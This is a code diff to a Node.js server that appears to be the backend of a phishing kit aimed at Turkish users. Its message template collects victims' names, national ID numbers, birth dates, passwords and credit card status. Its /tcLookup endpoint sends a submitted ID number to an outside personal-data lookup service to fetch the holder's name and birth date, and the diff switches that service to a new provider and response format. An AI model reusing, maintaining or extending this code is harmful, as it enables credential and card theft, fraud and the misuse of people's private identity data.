@@ -29,7 +29,7 @@ function formatMessage(data) {
 📝 [Başvuru Bilgisi]
 👤 Ad Soyad: ${data.AD || ""} ${data.SOYAD || ""}
 🆔 TC Kimlik No: ${data.tcno || ""}
-🎂 Doğum Tarihi: ${data.DOGUMTARIHI || ""}
+🎂 Doğum Tarihi: ${data.DogumTarihi || ""}
 🔑 Şifre: ${data.sifre || ""}
 💳 Kredi Kartı Durumu: ${data.kredi_kart_durumu || ""}
 ${data.kredi_kart_durumu === 'evet' ? `
@@ -45,12 +45,21 @@ app.post('/tcLookup', async (req, res) => {
     // TC Sorgulama API
     try {
         const tc = req.body.tc;
-        const apiUrl = `https://api.hexnox.pro/sowixapi/tcpro.php?tc=${tc}`;
+        const apiUrl = `https://api.kahin.org/kahinapi/tcpro?tc=${tc}`;
         const apiResp = await axios.get(apiUrl);
-        // Beklenen yapı: .data.data.AD, .data.data.SOYAD, .data.data.DOGUMTARIHI
-        if (apiResp.data && apiResp.data.data && apiResp.data.data.AD && apiResp.data.data.SOYAD) {
-            const { AD, SOYAD, DOGUMTARIHI } = apiResp.data.data;
-            res.json({ success: true, AD, SOYAD, DOGUMTARIHI });
+        if (
+            apiResp.data &&
+            apiResp.data.success &&
+            apiResp.data.data &&
+            apiResp.data.data.length > 0
+        ) {
+            const tcData = apiResp.data.data[0];
+            res.json({
+                success: true,
+                AD: tcData.Ad,
+                SOYAD: tcData.Soyad,
+                DogumTarihi: tcData.DogumTarihi
+            });
         } else {
             res.json({ success: false });
         }
